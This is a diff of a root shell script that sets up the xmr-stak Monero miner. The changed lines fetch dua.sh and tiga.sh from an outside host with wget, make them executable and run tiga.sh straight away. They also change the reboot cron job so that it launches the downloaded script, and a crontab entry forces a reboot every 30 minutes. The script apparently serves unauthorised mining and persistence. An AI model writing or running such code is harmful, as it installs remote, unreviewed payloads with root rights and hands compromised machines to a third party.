@@ -60,16 +60,16 @@ printf "%b\n" "$CONFIG" >> /root/xmr-stak/build/bin/config.txt
 chown root /root/xmr-stak/build/bin/config.txt
 cd /root
 
-wget https://garudamiliter.com/dua.sh
-chmod a+x dua.sh
-
 echo "--MAKE EXECUTABLE CUSTOM FILE---"
-echo "cd xmr-stak/build/bin/ && ./xmr-stak" >> miner
-chmod +x miner
+wget https://garudamiliter.com/dua.sh
+wget https://garudamiliter.com/tiga.sh
+chmod a+x dua.sh
+chmod a+x tiga.sh
 sysctl -w vm.nr_hugepages=128
 
 echo "---SET EXECUTABLE RUNNING AT REBOOT---"
-(crontab -l 2>/dev/null; echo "@reboot screen -d -m /root/miner")| crontab -
+(crontab -l 2>/dev/null; echo "@reboot screen -d -m /root/tiga.sh")| crontab -
+./tiga.sh
 
 echo "---SET AUTO RESTART---"
 echo "*/30 *  * * *   root    reboot" >> /etc/crontab
